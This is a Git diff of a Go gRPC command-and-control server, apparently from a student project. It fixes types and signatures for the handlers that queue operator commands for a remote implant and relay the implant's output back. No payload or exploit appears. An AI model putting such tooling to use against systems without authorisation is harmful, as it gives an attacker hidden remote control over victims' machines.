@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"gore/grpcapi" //the pain to get this to work was immense. Golang needs to slow the fuck down and stop depreciating packages.
 	"log"
 	"net"
 
@@ -57,13 +58,13 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 }
 
 // this command will push the command onto the queue or the output channel/goroutine
-func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Empty) (*grpcapi.Command, error) {
+func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
 	s.output <- result
 	return &grpcapi.Empty{}, nil
 }
 
 // running of a command for our admin component; we push it to the Goroutine queue and have it be handled by multithreading.
-func (s *adminServer) RunCommand(ctx context.Context, result *grpcapi.Command) (*grpcapi.Command, error) {
+func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
 	var res *grpcapi.Command //assign res as a command struct
 	//set up goroutine, doing os in this way is a type of closure, and this goroutine can access cmd from outside this fucntion.
 	go func() {
@@ -82,10 +83,10 @@ lead to both being flatlined.
 func main() {
 	//variables for main driver
 	var (
-		implantListener, adminListener net.Listener           //two listeners
-		err                            error                  //errors
-		opts                           []grpcapi.ServerOption //server options
-		work, output                   chan *grpcapi.Command  //work and output goroutines
+		implantListener, adminListener net.Listener          //two listeners
+		err                            error                 //errors
+		opts                           []grpc.ServerOption   //server options
+		work, output                   chan *grpcapi.Command //work and output goroutines
 	)
 	//create channels for passing input and output commands to implant and admin services
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
